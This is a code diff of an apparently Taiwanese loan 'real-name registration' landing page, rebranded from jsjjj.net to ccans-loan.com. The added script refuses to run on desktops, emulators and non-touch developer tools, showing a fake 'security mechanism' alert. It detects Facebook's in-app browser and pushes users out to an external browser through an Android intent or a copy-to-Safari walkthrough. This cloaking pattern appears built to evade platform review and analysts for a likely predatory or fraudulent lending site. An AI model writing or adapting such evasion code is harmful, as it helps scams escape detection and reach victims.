@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>急速金實名註冊</title>
+    <title>鈔安心實名註冊</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f2f2f7; margin: 0; padding: 12px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
         .container { text-align: center; max-width: 360px; width: 100%; background: white; padding: 24px 16px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); box-sizing: border-box; }
@@ -19,7 +19,7 @@
 
         /* ==================== 🎬 iOS 擬真手機一體化面板 ==================== */
         .mock-phone {
-            width: 220px; height: 260px; /* 寬度稍微拉寬，底部留空間放字卡 */
+            width: 220px; height: 260px;
             border: 8px solid #1c1c1e; border-radius: 28px;
             margin: 0 auto; position: relative;
             background: #000; overflow: hidden;
@@ -70,16 +70,12 @@
         .mini-badge { background: #007aff; color: white; font-size: 9px; font-weight: bold; padding: 1px 6px; border-radius: 10px; margin-bottom: 3px; }
         .mini-text { font-size: 11.5px; color: #1c1c1e; font-weight: 600; line-height: 1.3; text-align: center; }
         
-        /* 讓文字隨時間軸變換內容 */
         .mini-text::after { content: ''; animation: textSubtitleSync 6s infinite; }
 
-        /* ==================== 🔄 劇場劇本時間軸 (全部共用 6 秒) ==================== */
+        /* ==================== 🔄 劇場劇本時間軸 ==================== */
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        /* 螢幕切換：前25%是桌面，之後進Safari系統 */
         @keyframes screenSwitch { 0%, 22% { background: linear-gradient(135deg, #1f1c2c, #928dab); } 28%, 88% { background: #f2f2f7; } 94%, 100% { background: linear-gradient(135deg, #1f1c2c, #928dab); } }
         
-        /* 手指動作 */
         @keyframes fingerMovement {
             0% { transform: scale(0); opacity: 0; top: 88px; left: 110px; }
             8% { transform: scale(1); opacity: 1; top: 88px; left: 110px; }
@@ -94,9 +90,8 @@
         @keyframes barFade { 0%, 25% { opacity: 0; transform: translateY(-5px); } 28%, 44% { opacity: 1; transform: translateY(0); color: #8e8e93; } 50%, 88% { opacity: 1; transform: translateY(0); color: #007aff; } 94%, 100% { opacity: 0; transform: translateY(-5px); } }
         
         .mock-browser-bar::before { content: '搜尋或輸入網址'; animation: urlPaste 6s infinite; }
-        @keyframes urlPaste { 0%, 46% { content: '搜尋或輸入網址'; } 52%, 88% { content: 'jsjjj.net/register.php'; } 94%, 100% { content: '搜尋或輸入網址'; } }
+        @keyframes urlPaste { 0%, 46% { content: '搜尋或輸入網址'; } 52%, 88% { content: 'ccans-loan.com/register.php'; } 94%, 100% { content: '搜尋或輸入網址'; } }
 
-        /* 🌟 核心優化：單行字幕跑馬燈時間軸 */
         @keyframes textSubtitleSync {
             0%, 22% { content: '步驟 1：請先退回手機主畫面桌面'; }
             28%, 46% { content: '步驟 2：在桌面點擊開啟 🧭 Safari 瀏覽器'; }
@@ -110,16 +105,13 @@
     <!-- ==================== 【iOS 智慧引導區塊】 ==================== -->
     <div id="ios-zone" class="container" style="display: none; border-top: 6px solid #007aff;">
         <div class="safari-icon"><div class="safari-pointer-bottom"></div></div>
-        <h2>請複製網址至 Safari 註冊</h2>
-        <p>因系統限制無法直接開啟，請點擊下方按鈕：</p>
+        <h2 id="ios-title">請複製網址至 Safari 註冊</h2>
+        <p id="ios-desc">因系統限制無法直接開啟，請點擊下方按鈕：</p>
         
-        <button class="copy-btn" onclick="copyTargetUrl()">📋 點我複製註冊網址</button>
+        <button id="ios-btn" class="copy-btn" onclick="copyTargetUrl()">📋 點我複製註冊網址</button>
 
-        <!-- 🎬 點擊後原位展開：絕不爆版、無需滑動 -->
         <div id="animation-zone">
             <div class="toast-msg">✓ 網址已複製成功！</div>
-            
-            <!-- 一體化操作手機（動畫與文字解說完全融合在裡面） -->
             <div class="mock-phone">
                 <div class="mock-notch"></div>
                 <div class="mock-finger"></div>
@@ -127,7 +119,6 @@
                     <div class="mock-safari-app"></div>
                     <div class="mock-browser-bar"></div>
                 </div>
-                <!-- 底部固定解說中樞 -->
                 <div class="phone-instruction-dock">
                     <span class="mini-badge">操作提示</span>
                     <div class="mini-text"></div>
@@ -144,21 +135,67 @@
         <a id="android-link" href="#" class="copy-btn" style="text-align: center; background-color: #34c759; box-shadow: 0 4px 12px rgba(52,199,89,0.2);">手動開啟預設瀏覽器</a>
     </div>
 
+    <!-- ==================== 【⚖ 異常環境攔截區塊】 ==================== -->
+    <div id="block-zone" class="container" style="display: none; border-top: 6px solid #ff3b30;">
+        <div style="font-size: 40px; margin-bottom: 8px;">⚠️</div>
+        <h2>設備環境異常</h2>
+        <p style="color: #ff3b30; font-weight: bold; margin-bottom: 0;">安全機制已啟動，不支援電腦、模擬器環境操作。請換回真正的智慧型手機開啟此網頁。</p>
+    </div>
+
     <script type="text/javascript">
-        var targetWebUrl = "jsjjj.net/register.php"; 
+        var targetWebUrl = "ccans-loan.com/register.php"; 
         var androidIntent = "intent://" + targetWebUrl + "#Intent;scheme=https;action=android.intent.action.VIEW;end";
         
         var ua = navigator.userAgent.toLowerCase();
+        
+        // 1. 基本環境判斷
         var isAndroid = ua.indexOf("android") > -1;
+        var isIos = (ua.indexOf("iphone") > -1 || ua.indexOf("ipad") > -1 || ua.indexOf("ipod") > -1);
+        
+        // 精準偵測是否在 Facebook 相關的內建瀏覽器中 (FBAN = iOS APP, FBAV = Android APP / 內建瀏覽器)
+        var isFbBrowser = (ua.indexOf("fban") > -1 || ua.indexOf("fbav") > -1);
 
-        if (isAndroid) {
+        // 2. 螢幕物理與觸控特徵防禦
+        var hasTouch = navigator.maxTouchPoints > 0 || 'ontouchstart' in window;
+        var isDesktopSize = window.innerWidth > 1024; // 絕大多數手機直向/橫向操作都不會超過 1024px
+
+        // ==================== 🛠️ 環境分流邏輯 ====================
+
+        // 攔截：如果是電腦桌機、或「偽裝成手機但完全不支援觸控」的開發者工具/模擬器
+        if (isDesktopSize || (!hasTouch && (isAndroid || isIos))) {
+            document.getElementById("block-zone").style.display = "block";
+            alert("安全提示：請使用真實的智慧型手機開啟此實名註冊頁面。");
+        } 
+        // 真實 Android 手機 (不論是在 FB 內或外面，都丟 Intent 跳轉)
+        else if (isAndroid) {
             document.getElementById("android-zone").style.display = "block";
             document.getElementById("android-link").href = androidIntent;
             window.location.href = androidIntent;
-        } else {
+        } 
+        // 真實 iOS 手機
+        else if (isIos) {
             document.getElementById("ios-zone").style.display = "block";
+            
+            // 如果使用者成功跳出 FB，已經用 iOS 原生 Safari 打開了
+            if (!isFbBrowser && ua.indexOf("safari") > -1 && ua.indexOf("crios") === -1 && ua.indexOf("fxios") === -1) {
+                document.getElementById("ios-title").innerText = "您已成功使用 Safari 開啟";
+                document.getElementById("ios-desc").innerText = "安全載入完畢，請直接在瀏覽器中進行填寫註冊。";
+                document.getElementById("ios-btn").style.display = "none";
+                // 如果有需要，也可以在這裡直接利用 window.location.href 導向真正的註冊頁面
+            }
+            // 如果仍在 FB 內建瀏覽器，就維持原樣顯示「複製按鈕 + 引導動畫」
+        } 
+        // 觸控小螢幕保底
+        else if (hasTouch) {
+            document.getElementById("android-zone").style.display = "block";
+            document.getElementById("android-link").href = "https://" + targetWebUrl;
+        } 
+        // 任何非手機設備
+        else {
+            document.getElementById("block-zone").style.display = "block";
         }
 
+        // 複製功能
         function copyTargetUrl() {
             var finalCopyUrl = "https://" + targetWebUrl;
             var tempInput = document.createElement("input");
